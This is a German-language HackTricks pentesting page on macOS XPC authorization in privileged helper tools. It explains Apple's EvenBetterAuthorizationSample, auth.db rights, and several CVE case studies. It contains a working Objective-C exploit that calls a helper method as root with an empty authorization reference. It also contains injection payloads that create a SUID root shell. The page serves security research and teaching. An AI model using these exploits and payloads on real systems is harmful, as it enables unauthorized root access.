# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple bietet außerdem eine weitere Möglichkeit, zu authentifizieren, ob der verbindende Prozess **berechtigt ist, eine offengelegte XPC-Methode aufzurufen**.<sup>[[2]](#references)</sup>

Wenn eine Anwendung **Aktionen als privilegierter Benutzer ausführen** muss, installiert sie normalerweise einen HelperTool als root als XPC service, der von der Anwendung aufgerufen werden kann, um diese Aktionen auszuführen, anstatt die Anwendung als privilegierter Benutzer auszuführen. Die Anwendung, die den service aufruft, sollte jedoch über ausreichende Autorisierung verfügen.

### ShouldAcceptNewConnection always YES

Ein Beispiel ist in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) zu finden. In `App/AppDelegate.m` versucht die Anwendung, eine **Verbindung** zum **HelperTool** herzustellen. In `HelperTool/HelperTool.m` **prüft** die Funktion **`shouldAcceptNewConnection`** jedoch **keine** der zuvor genannten Anforderungen. Sie gibt immer YES zurück:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Weitere Informationen zur korrekten Konfiguration dieses Checks:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Anwendungsrechte

Allerdings findet **eine Autorisierung statt, wenn eine Methode aus dem HelperTool aufgerufen wird**.

Die Funktion **`applicationDidFinishLaunching`** aus `App/AppDelegate.m` erstellt, nachdem die App gestartet wurde, eine leere Autorisierungsreferenz. Das sollte immer funktionieren.\
Anschließend versucht sie, **dieser Autorisierungsreferenz einige Rechte hinzuzufügen**, indem sie `setupAuthorizationRights` aufruft:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die Funktion `setupAuthorizationRights` aus `Common/Common.m` speichert die Rechte der Anwendung in der auth database `/var/db/auth.db`. Beachte, dass sie nur die Rechte hinzufügt, die noch nicht in der Datenbank vorhanden sind:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die Funktion `enumerateRightsUsingBlock` wird verwendet, um die Anwendungsberechtigungen abzurufen, die in `commandInfo` definiert sind:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Das bedeutet, dass am Ende dieses Prozesses die in `commandInfo` deklarierten Berechtigungen in `/var/db/auth.db` gespeichert werden. Für **jede Methode**, die **Authentifizierung erfordert**, enthält die Datenbank den **Berechtigungsnamen** und **`kCommandKeyAuthRightDefault`**. Letzteres **gibt an, wer diese Berechtigung erhalten kann**.<sup>[[1]](#references)</sup>

Es gibt verschiedene Bereiche, um anzugeben, wer auf eine Berechtigung zugreifen kann. Einige davon sind in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) definiert (du findest [hier alle davon](https://www.dssw.co.uk/reference/authorization-rights/)); zusammengefasst:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Wert</th><th>Beschreibung</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Jede Person</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Der aktuelle Benutzer muss ein Administrator sein (Mitglied der Administratorgruppe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Den Benutzer zur Authentifizierung auffordern.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Den Benutzer zur Authentifizierung auffordern. Er muss ein Administrator sein (Mitglied der Administratorgruppe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Regeln festlegen</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Zusätzliche Kommentare zur Berechtigung festlegen</td></tr></tbody></table>

### Überprüfung der Berechtigungen

In `HelperTool/HelperTool.m` prüft die Funktion **`readLicenseKeyAuthorization`**, ob der Aufrufer zum **Ausführen dieser Methode** berechtigt ist, indem sie die Funktion **`checkAuthorization`** aufruft. Diese Funktion prüft, ob die vom aufrufenden Prozess gesendeten **authData** das **korrekte Format** hat, und anschließend, **was erforderlich ist, um die Berechtigung** zum Aufrufen der jeweiligen Methode zu erhalten. Wenn alles erfolgreich verläuft, ist der zurückgegebene **`error` gleich `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Um **die Voraussetzungen für den Erhalt des erforderlichen Rechts** zum Aufruf dieser Methode zu prüfen, überprüft `authorizationRightForCommand` das zuvor erwähnte **`commandInfo`**-Objekt. Anschließend ruft es **`AuthorizationCopyRights`** auf, um zu prüfen, **ob der Aufrufer über die erforderlichen Rechte** zum Aufruf der Funktion verfügt (beachte, dass die Flags eine Interaktion mit dem Benutzer erlauben).<sup>[[1]](#references)[[3]](#references)</sup>

In diesem Fall ist für den Aufruf der Funktion `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` auf `@kAuthorizationRuleClassAllow` festgelegt. Daher **kann sie jeder aufrufen**.

### DB-Informationen

Es wurde erwähnt, dass diese Informationen in `/var/db/auth.db` gespeichert werden. Du kannst alle gespeicherten Regeln mit folgendem Befehl auflisten:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Anschließend können Sie mit Folgendem auslesen, wer auf das Recht zugreifen kann:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Freizügige Berechtigungen

Du findest **alle Berechtigungskonfigurationen [**hier**](https://www.dssw.co.uk/reference/authorization-rights/), aber die Kombinationen, die keine Benutzerinteraktion erfordern, wären:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Dies ist der direkteste Schlüssel. Wenn er auf `false` gesetzt ist, legt er fest, dass ein Benutzer keine Authentifizierung bereitstellen muss, um dieses Recht zu erhalten.
- Dies wird **in Kombination mit einem der beiden folgenden Schlüssel oder mit der Angabe einer Gruppe verwendet**, der der Benutzer angehören muss.
2. **'allow-root': 'true'**
- Wenn ein Benutzer als root-Benutzer arbeitet (der über erhöhte Berechtigungen verfügt) und dieser Schlüssel auf `true` gesetzt ist, könnte der root-Benutzer dieses Recht potenziell ohne weitere Authentifizierung erhalten. Typischerweise erfordert der Wechsel zum Status eines root-Benutzers jedoch bereits eine Authentifizierung, daher handelt es sich für die meisten Benutzer nicht um ein Szenario ohne Authentifizierung.
3. **'session-owner': 'true'**
- Wenn dieser Schlüssel auf `true` gesetzt ist, würde der Besitzer der Sitzung (der aktuell eingeloggte Benutzer) dieses Recht automatisch erhalten. Dies könnte eine zusätzliche Authentifizierung umgehen, wenn der Benutzer bereits eingeloggt ist.
4. **'shared': 'true'**
- Dieser Schlüssel gewährt keine Rechte ohne Authentifizierung. Wenn er auf `true` gesetzt ist, bedeutet dies stattdessen, dass das Recht nach erfolgter Authentifizierung von mehreren Prozessen gemeinsam genutzt werden kann, ohne dass jeder Prozess sich erneut authentifizieren muss. Die ursprüngliche Gewährung des Rechts würde jedoch weiterhin eine Authentifizierung erfordern, sofern der Schlüssel nicht mit anderen Schlüsseln wie `'authenticate-user': 'false'` kombiniert wird.

Du kannst [**dieses Script verwenden**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9), um die interessanten Rechte zu erhalten:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Fallstudien zu Authorization Bypass

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Der privilegierte Mach-Service `com.acustica.HelperTool` akzeptiert jede Verbindung, und seine Routine `checkAuthorization:` ruft `AuthorizationCopyRights(NULL, …)` auf, sodass jeder 32-Byte-Blob akzeptiert wird. `executeCommand:authorization:withReply:` übergibt anschließend vom Angreifer kontrollierte, durch Kommas getrennte Strings als Root an `NSTask`, wodurch Payloads wie die folgenden möglich sind:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivial eine SUID root shell erstellen. Details in [diesem write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Der listener gibt immer YES zurück, und dasselbe NULL-`AuthorizationCopyRights`-Muster erscheint in `checkAuthorization:`. Die Methode `exchangeAppWithReply:` hängt Angreifer-Eingaben zweimal an einen `system()`-String an, sodass das Einschleusen von Shell-Metazeichen in `appPath` (z. B. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) über den Mach service `com.plugin-alliance.pa-installationhelper` zur Ausführung von Code als root führt. Weitere Informationen [hier](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Beim Ausführen eines Audits wird `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` abgelegt, der Mach service `com.jamf.complianceeditor.helper` offengelegt und `-executeScriptAt:arguments:then:` exportiert, ohne die `AuthorizationExternalForm` oder die code signature des Aufrufers zu überprüfen. Ein trivialer exploit erstellt mit `AuthorizationCreate` eine leere Referenz, stellt mit `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` eine Verbindung her und ruft die Methode auf, um beliebige Binaries als root auszuführen. Vollständige Reversing-Notizen (einschließlich PoC) finden sich in [Mykola Grymalyuks write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 und 7.4.0–7.4.2 akzeptierten manipulierte XPC-Nachrichten, die einen privilegierten helper ohne Authorization-Gates erreichten. Da der helper seiner eigenen privilegierten `AuthorizationRef` vertraute, konnte jeder lokale Benutzer, der Nachrichten an den service senden konnte, ihn dazu bringen, beliebige Konfigurationsänderungen oder Befehle als root auszuführen. Details in [SentinelOnes advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Tipps für eine schnelle Triage

- Wenn eine App sowohl eine GUI als auch einen helper enthält, sollten deren Code-Anforderungen verglichen und geprüft werden, ob `shouldAcceptNewConnection` den listener mit `-setCodeSigningRequirement:` sperrt (oder `SecCodeCopySigningInformation` validiert). Fehlende Prüfungen führen meist zu CWE-863-Szenarien wie im Jamf-Fall. Ein kurzer Blick sieht etwa so aus:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Vergleiche, was der Helper glaubt zu autorisieren, mit dem, was der Client bereitstellt. Setze beim Reversing einen Breakpoint auf `AuthorizationCopyRights` und bestätige, dass die `AuthorizationRef` aus `AuthorizationCreateFromExternalForm` stammt (vom Client bereitgestellt) und nicht aus dem eigenen privilegierten Kontext des Helpers. Andernfalls hast du wahrscheinlich ein CWE-863-Muster ähnlich den oben genannten Fällen gefunden.

## Reversing der Authorization

### Prüfen, ob EvenBetterAuthorization verwendet wird

Wenn du die Funktion **`[HelperTool checkAuthorization:command:]`** findest, verwendet der Prozess wahrscheinlich das zuvor erwähnte Schema für die Authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Wenn diese Funktion APIs wie `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` und `AuthorizationFree` aufruft, verwendet sie das Muster [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Überprüfe **`/var/db/auth.db`**, um festzustellen, ob es möglich ist, Berechtigungen zum Aufrufen einer privilegierten Aktion ohne Benutzerinteraktion zu erhalten.

### Protokollkommunikation

Als Nächstes musst du das Protokollschema finden, um eine Kommunikation mit dem XPC-Service herstellen zu können.

Die Funktion **`shouldAcceptNewConnection`** gibt das exportierte Protokoll an:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In diesem Fall haben wir dasselbe wie im EvenBetterAuthorizationSample, [**siehe diese Zeile**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Wenn der Name des verwendeten Protokolls bekannt ist, ist es möglich, seine **Header-Definition zu dumpen** mit:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Zuletzt müssen wir nur noch den **Namen des exponierten Mach Service** kennen, um eine Kommunikation mit ihm herzustellen. Es gibt mehrere Möglichkeiten, diesen zu finden:

- In **`[HelperTool init]`**, wo der verwendete Mach Service zu sehen ist:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- In der launchd-Plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit-Beispiel

In diesem Beispiel werden erstellt:

- Die Definition des Protokolls mit den Funktionen
- Eine leere auth, um Zugriff anzufordern
- Eine Verbindung zum XPC service
- Ein Aufruf der Funktion, wenn die Verbindung erfolgreich war
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Andere missbrauchte XPC-Privilege-Helper

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Autorisierungsdienste](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Privilege Escalation in Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Privilege-Escalation-Schwachstelle in FortiClient Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Lokale Privilege Escalation durch den Acustica Audio HelperTool XPC Service in Aquarius Desktop unter macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Lokale Privilege Escalation durch den Plugin Alliance InstallationHelper XPC Service](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Privilege Escalation im Apple EndpointSecurity framework (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Referenz zu Autorisierungsrechten (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
